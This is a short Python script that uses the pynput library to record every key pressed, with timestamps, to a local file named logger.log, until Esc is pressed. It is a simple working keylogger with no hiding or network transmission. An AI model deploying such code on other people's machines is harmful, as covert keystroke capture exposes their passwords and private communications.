import logging
from pynput import keyboard


logging.basicConfig(filename='logger.log', level=logging.DEBUG,
                    format='%(asctime)s %(message)s',
                    datefmt='%m/%d/%Y %I:%M:%S %p')


def on_press(key):
    if key == keyboard.Key.esc:
        listener.stop()
        logging.warning('listener is stopped...')

    else:
        message = '{} is pressed'.format(key)
        logging.warning(message)


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
